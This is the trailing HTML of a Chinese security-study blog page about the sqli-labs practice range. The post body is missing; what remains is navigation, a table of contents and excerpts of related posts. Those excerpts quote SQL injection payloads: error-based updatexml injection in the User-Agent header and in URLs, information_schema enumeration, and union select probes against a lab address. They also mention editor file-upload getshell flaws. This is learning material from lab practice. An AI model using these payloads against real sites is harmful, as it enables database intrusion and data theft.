src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/archives/ab52f8fd.html" title="sqli-labs靶场18-22"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">sqli-labs靶场18-22</div></div><div class="info-2"><div class="info-item-1">参考crow: https://github.com/crow821/crowsec less - 18 http头注入 浏览器插件ModHeader 通过修改User-Agent: 的值进行注入 原 : User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0 注入语句 : User-Agent: &#39; or updatexml(1,concat(0x7e,(database())),1) and &#39;1&#39;=&#39;1       (报错注入) 后续通过更改构造语句获得其他的信息  1&#x27; or updatexml(1,concat(0x7e,构造语句)),1) and &#x27;1&#x27;=&#x27;1 12345构造语句:查库： select schema_name from information_schema.schemata;查表： select table_name from information_s...</div></div></div></a><a class="pagination-related" href="/archives/4847d6c1.html" title="文本编辑器漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">文本编辑器漏洞</div></div><div class="info-2"><div class="info-item-1"> 常见的文本编辑器有CKEditor、.Ewebeditor、UEditor、KindEditor、XHeditor等。这类编辑器的功能是非常类似的，比如都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器 使用此类编辑器减少了程序开发的时间，但是却增加了许多安全隐患，比如：使用CKEditor编辑器有10万个树站，如果CKEditor爆出一个GetShell漏洞，那么这10万个网站都因此受到牵连。下面以FCKeditor编辑器为例，讲述文本编辑器漏洞。  FCK编辑器漏洞FCKeditor是一个开放源代码、所见即所得的文字编辑器，可以适用于ASP&#x2F;PHP&#x2F;ASPX&#x2F;JSP等脚本类型网站.  注：FCKeditor现已改名为CKEditor。  FCKeditor编辑器页&#x2F;查看编辑器版本&#x2F;查看文件上传路径FCKeditor编辑器页1FCKeditor/_samples/default.html  查看编辑器版本1FCKeditor/_whatsnew.html  查看文件上传路径1fckeditor/edito...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/archives/e73517db.html" title="SQL注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-25</div><div class="info-item-2">SQL注入</div></div><div class="info-2"><div class="info-item-1">注入漏洞形成原理 sql注入就是在数据交互中，前端数据传到后台时没有做严格的判断，导致传进来的数据被拼接到sql语句中，被当作sql语句的一部分进行执行，从而导致数据泄露，丢失甚至服务器瘫痪。如果代码中没有过滤或者过滤不严谨是会出现漏洞的。  网站分类静态网页： html或者htm，是一种静态的页面格式，不需要服务器解析其中的脚本。由浏览器如(IE、Chrome等)解析。   不依赖数据库 灵活性差，制作、更新、维护麻烦 交互性较差，在功能方面有较大的限制 安全，不存在SQL注入漏洞  动态网页： asp、aspx、php、jsp等，由相应的脚本引擎来解释执行，根据指令生成静态网页。   依赖数据库 灵活性好，维护简便 交互性好，功能强大 存在安全风险，可能存在SQL注入漏洞  SQL注入![](&#x2F;img&#x2F;Sql注入 (2).jpeg) 注入时信息收集![](&#x2F;img&#x2F;Sql注入- 2 (2).jpeg) 判断注入and 1&#x3D;1 正常and 1&#x3D;2 错误可能存在注入，其实归根结底就是看我们的输入会不会对网站造成影响，即我...</div></div></div></a><a class="pagination-related" href="/archives/e1f1921e.html" title="SQL注入- Sqlserver"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-29</div><div class="info-item-2">SQL注入- Sqlserver</div></div><div class="info-2"><div class="info-item-1">Sqlserver 介绍美国Microsoft公司推出的一种关系型数据库系统。SQLServer是一个可扩展的、高性能的、为分布式客户机&#x2F;服务器计算所设计的数据库管理系统，实现了与WindowsNT的有机结合，提供了基于事务的企业级信息管理系统方案。其主要特点如下：（1）高性能设计，可充分利用WindowsNT的优势（2）系统管理先进，支持Windows图形化管理工具，支持本地和远程的系统管理和配置。（3）强壮的事务处理功能，采用各种方法保证数据的完整性。（4）支持对称多处理器结构、存储过程、ODBC，并具有自主的SQL语言。 SQLServer以其内置的数据复制功能、强大的管理工具、与Internet的紧密集成和开放的系统结构为广大的用户、开发人员和系统集成商提供了一个出众的数据库平台。 常用语句 说明：创建数据库  1CREATE DATABASE database-name   说明：删除数据库  1drop database dbname  查询所有：  12Select * from 表名select * from Student  mssql数据库权限 sa...</div></div></div></a><a class="pagination-related" href="/archives/52c2c83e.html" title="SQL注入- Oracle&amp;Postgresql注入漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-29</div><div class="info-item-2">SQL注入- Oracle&amp;Postgresql注入漏洞</div></div><div class="info-2"><div class="info-item-1">oracle数据库介绍Oracle数据库系统是美国ORACLE公司（甲骨文）提供的以分布式数据库为核心的一组软件产品。是目前世界上使用最为广泛的数据库管理系统。基于“客户端&#x2F;服务器”模式结构，客户端应用程序与用户交互，接收用户信息，并向服务器发送请求，服务器系统负责管理数据信息和各种操作数据的活动。特点  支持多用户、大事务量的处理 数据安全性和完整性的有效控制 支持分布式数据处理 移植性强  Oracle 手工注入判断数据库 判断注入  12and 1=1and 1=2  判断oracle数据库  12and exists(select * from dual) and exists(select * from user_tables) 判断列数12order by 11   返回正常order by 12    返回错误 获取数据类型不匹配的列1http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100 union select null,null,null,null,null,null,null,null,null...</div></div></div></a><a class="pagination-related" href="/archives/fb99ab33.html" title="sqli-labs靶场 23-26"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-12</div><div class="info-item-2">sqli-labs靶场 23-26</div></div><div class="info-2"><div class="info-item-1">参考crow: https://github.com/crow821/crowsec Less-23 源码中对于 --+ # 进行了过滤处理， 所以这里我们只能使用and 或者or语句进行闭合,在这里可以使用另外一种特殊的注释符;%00通过这个注释符可以判断列数 除了在url末尾将–+、# --+ #替换为 ;%00   其余的均和less01关相同。  第二种报错注入1http://127.0.0.1/sqli/Less-23/?id=1&#x27; and updatexml(1,concat(0x7e,(database())),1) or &#x27;1&#x27;=&#x27;1 报错出数据库 1http://127.0.0.1/sqli/Less-23/?id=1&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 2,1)),1) or &#x27;1&#x27;=&#x27;1 查询所有的数据库，使用limit进行逐个查询。  后续...</div></div></div></a><a class="pagination-related" href="/archives/9e3b89d1.html" title="sqli-labs靶场1-10"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-26</div><div class="info-item-2">sqli-labs靶场1-10</div></div><div class="info-2"><div class="info-item-1">参考crow: https://github.com/crow821/crowsec MySQL连接的当前用户名和主机名： 1SELECT SYSTEM_USER(); MySQL连接的当前用户名和主机名： 1SELECT USER();  MySQL帐户的用户名和主机名： 1current_user() MySQL查看当前数据库 1select database(); MySQL查看当前数据版本 1select version(); MySQL查看安装路径 1@@datadir 当前操作系统 1@@version_compile_os 属于同一组，将属于同一组的列显示出来 1group_concat() A~B 1concat_ws(&#x27;~&#x27;,A,B)  常用命令查库：  1select schema_name from information_schema.schemata; 查表：  1select table_name from information_schema.tables where table_schema=&#x27;security&#x2...</div></div></div></a><a class="pagination-related" href="/archives/ab52f8fd.html" title="sqli-labs靶场18-22"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-09</div><div class="info-item-2">sqli-labs靶场18-22</div></div><div class="info-2"><div class="info-item-1">参考crow: https://github.com/crow821/crowsec less - 18 http头注入 浏览器插件ModHeader 通过修改User-Agent: 的值进行注入 原 : User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0 注入语句 : User-Agent: &#39; or updatexml(1,concat(0x7e,(database())),1) and &#39;1&#39;=&#39;1       (报错注入) 后续通过更改构造语句获得其他的信息  1&#x27; or updatexml(1,concat(0x7e,构造语句)),1) and &#x27;1&#x27;=&#x27;1 12345构造语句:查库： select schema_name from information_schema.schemata;查表： select table_name from information_s...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-11"><span class="toc-text">Less-11</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-12"><span class="toc-text">Less-12</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-13"><span class="toc-text">Less-13</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-14"><span class="toc-text">Less-14</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-15"><span class="toc-text">Less-15</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-16"><span class="toc-text">Less-16</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-17"><span class="toc-text">Less-17</span></a></li></ol></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2020 - 2026 By putdown</span></div><div class="footer_custom_text"><div> Welcome to lie down </div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><div class="js-pjax"></div><script src="https://lf6-cdn-tos.bytecdntimes.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.js"></script><script src="https://npm.elemecdn.com/meting@2.0.1/dist/Meting.min.js"></script><meting-js server="netease" type="playlist" id="811671960" fixed="true" mini="true" autoplay="false" theme="#49b1f5" loop="all" order="random" preload="auto" volume="0.5" mutex="true"></meting-js><script src="/js/widgets.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
